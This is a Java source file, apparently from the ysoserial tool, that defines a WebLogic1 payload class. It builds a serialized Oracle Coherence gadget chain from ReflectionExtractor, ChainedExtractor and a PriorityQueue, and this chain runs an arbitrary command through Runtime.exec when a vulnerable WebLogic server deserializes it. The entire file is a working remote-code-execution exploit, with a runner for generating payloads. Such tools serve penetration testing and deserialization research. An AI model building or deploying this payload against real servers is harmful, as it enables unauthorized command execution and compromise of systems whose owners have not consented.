package ysoserial.payloads;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
public class WebLogic1 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public PriorityQueue getObject(String command) throws Exception {
        final String[] execArgs = new String[] { command };
        ReflectionExtractor extractor1 = new ReflectionExtractor(
            "getMethod",
            new Object[]{"getRuntime", new Class[0]}
        );
        ReflectionExtractor extractor2 = new ReflectionExtractor(
            "invoke",
            new Object[]{null, new Object[0]}

        );
        ReflectionExtractor extractor3 = new ReflectionExtractor(
            "exec",
            new Object[]{execArgs}
        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
            extractor1,
            extractor2,
            extractor3,
        };
        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
            reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";
        return queue;
    }
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(WebLogic1.class, args);
    }

}
